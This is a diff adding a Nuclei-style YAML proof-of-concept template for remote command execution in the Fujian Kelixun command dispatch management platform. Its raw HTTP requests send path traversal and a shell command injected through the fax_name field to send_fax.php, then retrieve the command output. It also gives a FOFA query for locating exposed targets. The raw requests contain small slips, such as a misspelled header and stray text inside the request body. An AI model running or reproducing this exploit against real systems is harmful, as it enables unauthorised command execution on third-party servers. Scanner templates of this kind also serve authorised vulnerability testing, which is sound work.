@@ -1,0 +1,93 @@
+id: poc-scz5xzg4e0qfgv0i
+info:
+  name: 福建科立讯通信指挥调度管理平台 feedback 存在RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/scz5xzg4e0qfgv0i'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: scz5xzg4e0qfgv0i
+    fofa: app=”指挥调度管理平台”
+http:
+- raw:
+  - 'POST /custom/zx/fax/send_fax.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+
+    Connection: close
+
+    Conten-Length: 669
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+    Content-Disposition: form-data; name="sendfile";filename="whoami.php";
+
+    Content-Type: text/plain
+
+
+    11111111111111111111
+
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+    Content-Disposition: form-data; name="fax_extention"
+
+
+    ../../../../../..
+
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+    Content-Disposition: form-data; name="fax_caller_id_name"
+
+
+    file
+
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+    Content-Disposition: form-data; name="fax_caller_id_number"
+
+
+    file
+
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+    Content-Disposition: form-data; name="fax_name"
+
+
+    ;echo   `id`|tee        23333.txt;.pdf
+
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+
+
+    2.得到结果'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /custom/zx/fax/23333.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Cookie: PHPSESSID=aniu915gd93i5bnkjhk7n4saf2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
